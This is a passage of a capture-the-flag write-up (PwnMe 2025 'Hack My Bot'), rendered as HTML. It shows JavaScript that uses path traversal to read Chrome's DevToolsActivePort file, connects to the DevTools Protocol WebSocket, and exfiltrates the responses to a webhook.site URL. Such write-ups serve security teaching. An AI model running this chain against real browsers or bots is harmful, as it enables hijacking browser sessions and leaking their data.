+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hook</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://webhook.site/&lt;id&gt;/&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://localhost/logs../browser_cache/DevToolsActivePort&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> [<span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">path</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\\n&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">devTools</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>Now that we have crafted the <code>devTools</code> CDP endpoint, let&rsquo;s confirm that we can talk to it by exfiltrating it&rsquo;s response back to us.</p>
+<p>First, we will look at the <a href="https://chromedevtools.github.io/devtools-protocol/">CDP documentation</a> to see how we can speak with it. I really recommend reading that page.</p>
+<p>The CDP protocol is based on web sockets, however it offers few convenience HTTP endpoints such as <code>/json/version</code> and <code>/json/list</code>.</p>
+<p>These endpoints are not accessible to us (I tried) due to SOP and CORS preventing us from reading them.</p>
+<p><img src="/posts/hack-my-bot-pwnme-2025-ctf/cdp-browser-getversion.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#a6e22e">devTools</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Browser.getVersion&#39;</span>
+</span></span><span style="display:flex;"><span>	}));
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onmessage</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">hook</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;data&#39;</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>)}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="chapter-3-narrowing-in">Chapter 3: Narrowing In<a href="#chapter-3-narrowing-in" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/uoft-2025-ctf/">
+                <span class="button__text">UofT 2025 CTF (Web)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="//localhost:1313/assets/main.js"></script>
+<script src="//localhost:1313/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
